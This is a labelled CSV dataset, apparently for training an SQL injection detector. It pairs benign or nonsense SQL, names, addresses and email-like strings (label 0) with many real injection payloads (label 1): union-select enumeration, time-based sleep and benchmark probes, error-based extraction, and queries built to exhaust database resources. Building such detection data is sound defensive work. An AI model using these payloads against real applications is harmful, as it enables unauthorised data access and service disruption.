Query,Label
SELECT * FROM feed WHERE    NOT country = 'herself',0
" select * from users where id  =  1. <@ union select version  (    )  ,version  (    )   -- 1",1
"  SELECT be,dark,finger FROM base LEFT JOIN Orders ON congress.cookiesID =  start.spring ORDER BY keep.stuck",0
baides,0
54011879j,0
"1%'   )    )     )   union all select null,null,null,null,null,null,null,null,null#",1
SELECT * FROM although 3 SELECT * FROM frozen,0
SELECT COUNT ( dance )  FROM slowly,0
 (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and '%'  =  ',1
rebolledo de la torre,0
SELECT * FROM slipped WHERE printed BETWEEN themselves09/01/1996trouble AND your15/31/1996help,0
SELECT * FROM above WHERE simple = 'research',0
SELECT * FROM slept,0
"1""   )    )    and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and    (    (   ""uglh"" like ""uglh",1
"1'   )    )    as atpy where 9020  =  9020 or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",1
1'  )   as gsjr where 7046  =  7046 and sleep  (  5  )  #,1
"1' union all select null,null,null,null,null,null,null,null,null,null#",1
"   SELECT Employees.according, COUNT ( Orders.gooseID )  AS scienceFROM    ( OrdersINNER JOIN frozen ON Orders.quiteID  =  Employees.cameID ) ",0
"1%'   )    )    union all select null,null,null,null,null,null#",1
SELECT * FROM sit WHERE    NOT chose = 'newspaper',0
"1'   )    )    as usrk where 6324  =  6324 union all select null,null,null,null,null,null,null,null,null,null--",1
SELECT option_value FROM wp_options WHERE option_name  =  '_houzez_property_type_2712' LIMIT 1,0
-8143  )   union all select 3014--,1
"  UPDATE worry SET seven =  'man', City =  'easily' WHERE hope =  action",0
1' where 9206  =  9206,1
"-6505'   )    )    as jtnp where 1037  =  1037 or elt  (  1032  =  1032,3623  )  --",1
1  )   where 1096  =  1096,1
SELECT * FROM entire WHERE rather BETWEEN '1996-07-01' AND '1996-07-31',0
"1"" where 7788  =  7788 or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1
"1""   )    )    or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (   ""giuq""  =  ""giuq",1
"-5124'+  (  select 'xpww' where 1752  =  1752 union all select 1752,1752,1752,1752,1752,1752,1752,1752,1752,1752--",1
"-8943%'  )   union all select 7710,7710#",1
"-2314""   )    )    or make_set  (  9354  =  9354,7185  )   and    (    (   ""uatq"" like ""uatq",1
"  UPDATE shade SET scene =  'failed', City =  'herself' WHERE fastened =  fear",0
" SELECT * FROM blank ORDER BY death, what",0
"-3279"" union all select 8568,8568,8568,8568--",1
"pl. san marcos, 0, 11f",0
"1%'  )   or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --",1
steinfeld@multireform.sg,0
"1'||  (  select 'uusj' where 2149  =  2149 or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )     )  ||'",1
SELECT option_value FROM wp_options WHERE option_name  =  '_site_transient_wp_wps_bg_non_library_sync_1_process_lock' LIMIT 1,0
franchetti.martinsan@elsentidodelavida.qa,0
SELECT film ( s )  FROM getting UNION ALL,0
"  SELECT * FROM simply WHERE rush NOT IN  ( 'pride', 'general', 'hold' )  ",0
3.37557E+15,0
80937614q,0
"1%""   )    )    or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )   and    (    (   ""%""  =  """,1
"  UPDATE second SET rocket =  'hearing', City =  'use' WHERE test =  slept",0
resquebrar,0
"1' in boolean mode  )   union all select null,null,null,null,null,null,null,null,null,null#",1
hoyo higueron 32 3-f,0
"select * from generate_series  (  6200,6200,case when   (  6200  =  5449  )   then 1 else 0 end  )   limit 1--",1
" select * from users where id  =  '1' or \<$ union select 1,@@VERSION -- 1'",1
SELECT * FROM development ORDER BY load DESC,0
select * from users where id  =  1.%@ or 1  =  1 -- 1,1
"   SELECT dress, title+ ', ' + dish+ ' ' + seed+ ', ' + dog AS pipe  FROM frighten",0
25480,0
" SELECT Customers.CustomerName, Orders.OrderIDFROM CustomersFULL OUTER JOIN OrdersON Customers.CustomerID = Orders.CustomerIDORDER BY Customers.CustomerName;",0
antypas sardans,0
SELECT MIN ( Price )  AS SmallestPriceFROM Products;,0
jorge paquirachi,0
SELECT MIN ( among )  AS worker FROM pool,0
esbarar,0
" SELECT column_name ( s )  FROM individual,moon",0
"  SELECT prize,disease FROM explanation WHERE character = 'lead' UNION SELECT telephone, perhaps FROM raw",0
"  SELECT value,handsome FROM thus WHERE entire = 'street' UNION SELECT refer, me FROM tribe",0
SELECT COUNT ( plateID ) FROM deer,0
"   SELECT COUNT ( heard ) , floating FROM harder BY difficult",0
itrabo,0
1'+  (  select kzgg where 5070  =  5070,1
" select * from users where id  =  1 or ""  (  @"" or 1  =  1 -- 1",1
"  SELECT Orders.shoutrID, Employees.twenty, Employees.be FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.settleID ORDER BY Orders.governmentID",0
SELECT stretch ( s )  FROM twelve SELECT grass FROM aid,0
SELECT COUNT ( shine )  FROM poet,0
SELECT * FROM measure WHERE too = 'beginning' FETCH FIRST 3 ROWS ONLY,0
"1'   )    )     )   and elt  (  4249  =  4249,7259  )   and    (    (     (  'kgdt' like 'kgdt",1
"   SELECT enemy, pay+ ', ' + process+ ' ' + myself+ ', ' + hold AS value  FROM stick",0
"  SELECT gave AS add, welcome AS [river]  FROM officer",0
wickens@cpanelhost.com.ht,0
"-1372%'   )    )     )   union all select 8403,8403,8403,8403#",1
SELECT TOP 50 PERCENT * FROM particularly,0
"elt  (  5098  =  2728,1  )  ",1
SELECT AVG ( greatest ) FROM seen,0
SELECT CEILING ( 25.75 ) ;,0
SELECT MIN ( Price )  AS SmallestPrice FROM Products;,0
SELECT stomach ( s FROM football RIGHT JOIN,0
"1   )    )    and elt  (  1210  =  1210,sleep  (  5   )    )    and    (    (   5874  =  5874",1
SELECT AVG ( sweet ) FROM tired SELECT SUM ( purple ) ,0
flis@14horas.gt,0
SELECT football ( s )  FROM lovely LEFT JOIN,0
zaca27,0
"1'  )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and   (  'lkun' like 'lkun",1
SELECT * FROM tropical WHERE percent = 'reader',0
1  )   where 1090  =  1090 and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )  --,1
"1%'   )    )     )   and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and    (    (     (  '%'  =  '",1
SELECT COUNT ( thing )  FROM careful,0
"1  )   where 2678  =  2678 union all select null,null,null,null,null,null,null,null,null#",1
"-1917""  )   or 8571  =  8571--",1
"1"" or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and ""uqor"" like ""uqor",1
descerrajada,0
"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  +'",1
SELECT * FROM ten FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM draw,0
82751097h,0
-9389'  )   or 8859  =  3989--,1
SELECT * FROM local ORDER BY pet,0
SELECT COUNT ( won )  FROM should,0
michell4@so-tel.jobs,0
DELETE FROM everything WHERE when = 'eventually',0
"-4543""  )   or 3038  =  3038",1
   ( SELECT ProductID   FROM OrderDetails   WHERE Quantity > 99 ) ;,0
5.01063E+15,0
-4325 order by 1--,1
"select count  (  *  )   from generate_series  (  1,5000000  )   and ""%""  =  """,1
SELECT TOP 3 * FROM list WHERE experience = 'lamp',0
"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual and    (    (   'fnna'  =  'fnna",1
select   (  case when   (  4780  =  4432  )   then 4780 else 4780*  (  select 4780 from mysql.db  )   end  )  #,1
"   SELECT Employees.eat, COUNT ( Orders.fairlyID )  AS interiorFROM    ( OrdersINNER JOIN imagine ON Orders.fearID  =  Employees.thingID ) ",0
25187,0
"   SELECT guide, troops, condition FROM crew WHERE piece  IS NULL",0
"  SELECT equallyID AS ID, dance AS hang FROM duck",0
"1'||  (  select 'tkmc' from dual where 9675  =  9675 union all select null,null,null,null--",1
",@variable",1
"1"" where 9804  =  9804 or char  (  75  )  ||char  (  70  )  ||char  (  99  )  ||char  (  83  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1
raudres,0
kinsman,0
select   (  case when   (  6615  =  3564  )   then 1 else 6615*  (  select 6615 from master..sysdatabases  )   end  )  --,1
"  SELECT sold,fully FROM sugar WHERE figure = 'symbol' UNION SELECT garage, had FROM carbon",0
-1621' in boolean mode  )   order by 1--,1
SELECT mood ( s )  FROM vessels UNION ALL,0
SELECT * FROM cut,0
san vicente de la cabeza,0
1 rlike   (  select   (  case when   (  8314  =  5463  )   then 1 else 0x28 end   )    ) ,1
"   SELECT Employees.house, COUNT ( Orders.roofID )  AS breakFROM    ( OrdersINNER JOIN bowl ON Orders.careID  =  Employees.uponID ) ",0
2.04422E+15,0
"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  'leps' like 'leps",1
SELECT earn ( s )  FROM close,0
maeya,0
"1""  )   as ipxg where 4031  =  4031 and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )  --",1
SELECT TOP 50 PERCENT * FROM enter SELECT * FROM soldier FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM property,0
15807509t,0
"1""   )    )    or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (   ""lxue"" like ""lxue",1
" select sleep  (  5  )   and    (    (   ""wueo""  =  ""wueo",1
"1'  )   as knxr where 5662  =  5662 union all select null,null,null,null,null,null,null,null#",1
SELECT * FROM tune WHERE capital BETWEEN 'guess' AND 'purple',0
SELECT * FROM origin WHERE bridge = 'sport',0
select   (  case when   (  2576  =  7563  )   then 2576 else 1/  (  select 0  )   end  )  --,1
9.45394E+14,0
SELECT * FROM during WHERE mind = 'walk'  OR sound = 'since',0
"  SELECT PERIOD_ADD ( 201703, 5 ) ;",0
1'   )    )    or sleep  (  5  )  #,1
desafinar,0
SELECT option_value FROM wp_options WHERE option_name  =  '_transient_timeout_wp_stateless_google_sdk_conflict' LIMIT 1,0
SELECT necessary FROM layers UNION SELECT most FROM on ORDER BY power,0
"c/ benasau, 196, 10?h",0
"1""   )    )    and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",1
" select * from users where id  =  1 or ""1{"" or 1  =  1 -- 1",1
"   SELECT desert, bell+ ', ' + immediately+ ' ' + fell+ ', ' + stairs AS lungs  FROM lift",0
SELECT * FROM solid FETCH FIRST 50 PERCENT ROWS ONLY,0
1   )    )    as epfz where 5471  =  5471,1
1'  )   as pghp where 9086  =  9086,1
1'  )   and 2564  =  3234--,1
SELECT * FROM letter WHERE Price NOT BETWEEN 10 AND 20,0
1'+  (  select bfeq where 3445  =  3445 and 9198  =  9198--,1
select * from users where id  =  '1'   or 1  =  1 -- 1',1
SELECT TOP 3 * FROM fruit WHERE met = 'religious' SELECT * FROM addition,0
4.77403E+15,0
"1"" and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )  ",1
"1'||  (  select 'dukt' where 3206  =  3206 or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7   )    )   ||'",1
agn,0
83677248m,0
"1"" where 4345  =  4345 and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )   --",1
SELECT AVG ( war ) FROM layers SELECT SUM ( men ) ,0
"-4905"" union all select 6082,6082--",1
"   SELECT understanding, seldom+ ', ' + dull+ ' ' + route+ ', ' + fully AS ill  FROM nine",0
0x770061006900740066006F0072002000640065006C00 ...,1
divinizacin,0
"1  )   where 8734  =  8734 procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",1
"pobla tornesa, la",0
"-8725""   )    )     )   or   (  8459  =  8459  )  *4906 and    (    (     (  ""vblw"" like ""vblw",1
burns-gerron@100mbps.ht,0
"-7794""  )   union all select 3910,3910,3910,3910,3910,3910,3910,3910,3910,3910#",1
SELECT * FROM sun WHERE swimming = 'material' FETCH FIRST 3 ROWS ONLY,0
"1""   )    )    or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and    (    (   ""aall"" like ""aall",1
SELECT * FROM effect WHERE laugh = 'warm' FETCH FIRST 3 ROWS ONLY,0
SELECT * FROM near ORDER BY zipper,0
17179,0
SELECT AVG ( steady ) FROM stone SELECT SUM ( bare ) ,0
lug5r,0
"-3316%"" or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and ""%""  =  """,1
" SELECT column_name ( s )  FROM tube,would",0
"1""  )   as eefe where 5290  =  5290 and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #",1
"1"" and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and ""ygzq"" like ""ygzq",1
"1%' or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and '%'  =  '",1
"INSERT INTO double ( visitor, sure, donkey, nuts, soldier, press )  VALUES  ( 'handle', 'off'. horn', 'brave', 'thirty', 'square', 'stove' )  ",0
17773,0
SELECT again ( s )  FROM sets LEFT JOIN,0
keaton3,0
SELECT DAYOFMONTH ( CURDATE (   )  )  ;,0
1'+  (  select 'mjgo' where 4026  =  4026,1
SELECT option_value FROM wp_options WHERE option_name  =  '_options_instagram_url' LIMIT 1,0
"1'+  (  select 'qrml' where 3791  =  3791 or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )     )  +'",1
foto3rfico,0
9.49221E+15,0
SELECT * FROM also WHERE Price NOT BETWEEN 10 AND 20,0
end,1
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 28313 )  ORDER BY meta_id ASC",0
"  SELECT * FROM why WHERE rear NOT IN  ( 'wagon', 'theory', 'battle' )  ",0
SELECT * FROM myself WHERE involved BETWEEN 'similar' AND 'luck',0
"1'||  (  select 'svbf' where 7017  =  7017 or elt  (  6272  =  6272,sleep  (  5   )    )     )  ||'",1
56,0
godayol iafrate,0
SELECT weight FROM possible UNION SELECT what FROM egg ORDER BY orange,0
"SELECT * FROM Users WHERE Name  = ""John Doe"" AND Pass  = ""myPass""",0
"1'  )    (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )   and   (  'sstt'  =  'sstt",1
1'   )    )    as iipj where 6560  =  6560,1
SELECT COUNT ( possibly ) FROM roll,0
ulls,0
"1%"" and 2716  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1
moll@eurograb.ic,0
"-5205'   )    )    union all select 8592,8592,8592,8592,8592,8592--",1
SELECT COUNT ( particular ) FROM kitchen,0
SELECT * FROM mill,0
"-5372""  )   as wlqm where 2432  =  2432 union all select 2432,2432,2432,2432,2432,2432#",1
SELECT * FROM phrase FETCH FIRST 3 ROWS ONLY,0
"   SELECT worth, seen+ ', ' + wise+ ' ' + remember+ ', ' + comfortable AS needs  FROM death",0
alcolea,0
condemios de arriba,0
SELECT depth FROM simple UNION SELECT stared FROM horse ORDER BY thought,0
c/ coca de la piera 167,0
0orru6t5,0
"-5424'   )    )    union all select 8231,8231,8231,8231,8231,8231,8231,8231#",1
-5369'  )   or 3208  =  6669#,1
SELECT AVG ( police )  FROM sang  SELECT SUM ( known ) ,0
"  SELECT PERIOD_DIFF ( 1703, 1612 ) ;",0
anamary,0
pe7tr0b9,0
2.25315E+15,0
1'   )    )     )   or sleep  (  5  )  #,1
"1'  )   and elt  (  4249  =  4249,7259  )   and   (  'bxnn'  =  'bxnn",1
41713468r,0
DELETE FROM cloud WHERE happy = 'wash',0
standfor,0
alberta,0
"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and    (    (   'ufbr'  =  'ufbr",1
SELECT * FROM prepare WHERE began NOT LIKE 'flew%',0
-1603'   )    )    or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (   'abmo'  =  'abmo,1
" SELECT * FROM who ORDER BY suppose ASC, correctly DESC",0
"1'   )    )    and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (   'swjk'  =  'swjk",1
SELECT * FROM pan WHERE thumb = 'fair'  OR nature = 'pole',0
SELECT * FROM planet FETCH FIRST 50 PERCENT ROWS ONLY,0
1' where 7828  =  7828 or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,1
SELECT TOP number | percent column_name FROM table_name WHERE condition ;,0
SELECT * FROM species ORDER BY love,0
"1""   )    )    as ecnn where 8913  =  8913 or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )  --",1
a4go37a,0
1   )    )    as xoch where 8765  =  8765 and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )  --,1
SELECT * FROM goes  WHERE any NOT LIKE '[crew]%',0
" select * from users where id  =  '1' <@$_ union select 1,version  (    )   -- 1'",1
SELECT * FROM age WHERE planet NOT LIKE '[bee]%',0
71196230y,0
seymour@evelin.gn,0
"   SELECT hit, hunt+ ', ' + property+ ' ' + today+ ', ' + couple AS outline  FROM clay",0
ceseri@discotecateatre.do,0
"1   )    )    as hqwy where 4433  =  4433 or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   --",1
SELECT fix FROM air UNION ALL SELECT national FROM pale ORDER BY cat,0
" select * from users where id  =  1 union select 1a#,banner from v$version where rownum  =  1 -- 1",1
SELECT * FROM hide WHERE secret = 'careful' FETCH FIRST 3 ROWS ONLY,0
SELECT scientific FROM many,0
"c/ fancelli, 34 6b",0
jande,0
"-1993%""  )   or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and   (  ""%""  =  """,1
SELECT * FROM property ORDER BY get,0
"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and    (    (     (  ""mubt""  =  ""mubt",1
"1'   )    )    or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (   'qgov'  =  'qgov",1
torre de arcas,0
"-2441' union all select 1853,1853,1853,1853,1853,1853,1853--",1
zoldou@stainless.tw,0
"  SELECT byID AS ID, alphabet AS cover FROM jet",0
" select * from users where id  =  1 or \<   =  1 union select 1,@@VERSION -- 1",1
wilbur,0
1'+  (  select aqhj where 4419  =  4419,1
"1""   )    )    union all select null,null,null,null,null,null#",1
-8515' or 1329  =  9536,1
"1""  )   where 2136  =  2136 or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1
"  SELECT bowID AS ID, wheat AS flower FROM park",0
"   SELECT itself, stood, protection FROM how WHERE mountain  IS NULL",0
select   (  case when   (  3539  =  8768  )   then 3539 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,1
monturi,0
SELECT option_value FROM wp_options WHERE option_name  =  'options_facebook_url' LIMIT 1,0
"calle hostieros, 24",0
gabriela1,0
" SELECT column_name ( s )  FROM throat,tell",0
"1%'  )   or elt  (  5873  =  5873,sleep  (  5   )    )   #",1
SELECT COUNT ( fifth )  FROM at,0
"1'   )    )     )   or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and    (    (     (  'gucd'  =  'gucd",1
SELECT wp_posts.* FROM wp_posts WHERE ID IN  ( 367654 ) ,0
" select * from users where id  =  1 or ""{  (  ""  =  1 or 1  =  1 -- 1",1
"   SELECT pack,ourselves,dirty,church,basket     (  (  nice JOIN couple ON fur.made =  blood.still )   INNER JOIN answerON Orders.slipped =  nine.fearID ) ",0
1   )    )    as xcsm where 9231  =  9231,1
tewksbur,0
SELECT diameter ( s )  FROM pictured FULL OUTER JOIN,0
"-1166'   )    )    as icdz where 1042  =  1042 union all select 1042,1042,1042,1042,1042#",1
SELECT * FROM five WHERE Price NOT BETWEEN 10 AND 20,0
"-4637' union all select 9361,9361,9361,9361,9361,9361,9361,9361#",1
-7864 or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )   # twpw,1
"c/ moncayo, 36, 10-d",0
SELECT AVG ( long ) FROM danger SELECT SUM ( safe ) ,0
4s2cu8e44,0
bernadet,0
 UPDATE basic SET proper = 'bag'WHERE high = 'did',0
"calle espio, 120, 11?a",0
"1""   )    )    as sdlv where 5922  =  5922 and 2006  =  2006",1
SELECT COUNT ( sillyID ) FROM tide,0
SELECT knew ( s FROM belong RIGHT JOIN,0
"paratge lila 30, 10?c",0
luna,0
" SELECT CONCAT_WS ( "" "", Address, PostalCode, City )  AS Address FROM  Customers;",0
" select * from users where id  =  1 or \.<$ union select 1,@@VERSION -- 1",1
25330,0
gueldos donohue,0
fogars de la selva,0
SELECT * FROM  ( SELECT instrument FROM busy ) ,0
"-3326'+  (  select xitp where 7621  =  7621 union all select 7621,7621,7621,7621,7621,7621,7621,7621,7621,7621#",1
"1""   )    )    as ydkd where 2455  =  2455 and sleep  (  5  )  --",1
select case when 2640  =  9249 then 1 else null end--,1
select   (  case when   (  6204  =  1913  )   then 6204 else 6204*  (  select 6204 from information_schema.character_sets  )   end  )  #,1
SELECT * FROM bread WHERE war = 'damage',0
bols,0
SELECT colony ( s )  FROM cover SELECT molecular FROM how,0
"   SELECT COUNT ( run ) , conversation FROM open BY shoe",0
SELECT COUNT ( out ) FROM port,0
-8045   )    )     )   order by 1--,1
1 and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )  -- jdia,1
"-4522""  )   or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and   (  ""mbkq""  =  ""mbkq",1
SELECT * FROM somewhere FETCH FIRST 50 PERCENT ROWS ONLY,0
"-9758'+  (  select 'rlcy' where 3691  =  3691 union all select 3691,3691,3691,3691,3691,3691,3691--",1
SELECT AVG ( Price ) FROM home,0
"-5657'   )    )     )   union all select 8071,8071,8071,8071,8071,8071,8071,8071#",1
5.58043E+15,0
hoya-gonzalo,0
nadina,0
"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )   --",1
"-7412""  )   as qngt where 2041  =  2041 union all select 2041--",1
SELECT * FROM child WHERE    NOT blow = 'flight',0
"1',  (  select   (  case when   (  7616  =  7616  )   then 1 else 1/  (  select 0  )   end   )    )   ",1
SELECT single FROM invented UNION SELECT pick FROM heading ORDER BY hospital,0
SELECT * FROM Orders WHERE OrderDate BETWEEN '1996-07-01' AND '1996-07-31';,0
stanger-kitabayashi7@gestionsoftware.th,0
SELECT compare FROM sitting UNION ALL SELECT born FROM combination ORDER BY hurt,0
1   )    )     )   and 6358  =  6735,1
1438,0
SELECT * FROM lose  WHERE other NOT LIKE '[southern]%',0
SELECT * FROM worse 3,0
"1%""   )    )    or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and    (    (   ""%""  =  """,1
"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and    (    (     (  'jutx'  =  'jutx",1
"  SELECT goldID AS ID, wheat AS running FROM poem",0
5866,0
SELECT COUNT ( wrappedID ) FROM upward,0
SELECT COUNT ( jarID ) FROM teeth,0
